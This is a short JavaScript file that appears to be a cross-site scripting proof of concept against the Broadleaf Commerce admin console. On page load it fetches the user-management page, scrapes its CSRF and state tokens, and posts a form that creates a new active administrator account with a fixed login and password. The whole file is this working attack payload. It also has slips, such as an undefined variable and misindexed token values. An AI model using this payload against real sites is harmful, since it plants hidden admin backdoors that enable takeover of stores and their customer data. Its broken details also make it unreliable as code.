window.addEventListener("load", getTokenJS());

function getTokenJS() {
	alert('submit token');
    var xhr = new XMLHttpRequest();
    xhr.responseType = "document";
    xhr.open("GET", "/admin/user-management", true);
    xhr.onload = function (e) {
        if (xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            page = xhr.response
            csrf = page.getElementsByName("csrfToken");
            state = page.getElementsByName("stateVersionToken");
            console.log("The token is: " + input[0].value);
            console.log("The state is: " + state[0].value);
            submitFormWithTokenJS(input.value[0], state.value[0]);
        }
    };
    xhr.send(null);
}

function submitFormWithTokenJS(token, state) {
		alert('submit cookie');

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/admin/user-management/add", true);

    // Send the proper header information along with the request
    xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");

    // This is for debugging and can be removed
    xhr.onreadystatechange = function() {
        if(xhr.readyState === XMLHttpRequest.DONE && xhr.status === 200) {
            console.log(xhr.responseText);
        }
    }

    xhr.send("ceilingEntityClassname=org.broadleafcommerce.openadmin.server.security.domain.AdminUser&entityType=org.broadleafcommerce.openadmin.server.security.domain.AdminUserImpl&id=&sectionCrumbs=&mainEntityName=&preventSubmit=false&jsErrorMapString=&fields%5B'name'%5D.value=aflibbert&fields%5B'login'%5D.value=aflibbert&fields%5B'email'%5D.value=aflibbert%40example.com&fields%5B'phoneNumber'%5D.value=&fields%5B'password'%5D.value=aflibbert&fields%5B'passwordConfirm'%5D.value=aflibbert&fields%5B'activeStatusFlag'%5D.value=true&fields%5B'auditable__createdBy'%5D.value=&fields%5B'auditable__dateCreated'%5D.value-display=&fields%5B'auditable__dateCreated'%5D.value=&fields%5B'auditable__updatedBy'%5D.value=&fields%5B'auditable__dateUpdated'%5D.value-display=&fields%5B'auditable__dateUpdated'%5D.value=&csrfToken="+token+"&stateVersionToken="+state);
}
